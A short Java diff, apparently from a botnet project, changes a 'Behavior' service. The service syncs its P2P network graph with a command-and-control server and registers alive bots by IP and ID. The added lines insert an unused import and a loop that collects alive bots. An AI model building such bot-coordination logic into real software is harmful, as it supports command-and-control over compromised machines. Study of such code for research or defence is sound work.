@@ -9,6 +9,7 @@ import java.util.List;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.Future;
 
+import org.apache.jasper.tagplugins.jstl.core.ForEach;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
@@ -472,6 +473,16 @@ public class Behavior {
 		vertex.forEach(v -> System.out.println("vertex " + v.getIp()));
 		System.out.println("Aggiorno grafo rete P2P con quello del C&C");
 		pServ.updateNetworkP2P(edge, vertex);
+		
+		SyncIpList<IP, String> gg = nServ.getAliveBot();
+		
+		for (Bot bot : bots) {
+			if(vertex.indexOf(new IP(bot.getIp()))>=0)
+				gg.add(new Pairs<IP,String>(new IP(bot.getIp()),bot.getIdBot()));
+		}
+
+		
+		
 		// avvisa cec che se ready
 		Boolean b = req.ready(ip, myId);
 		if ((b != null) && (b)) {
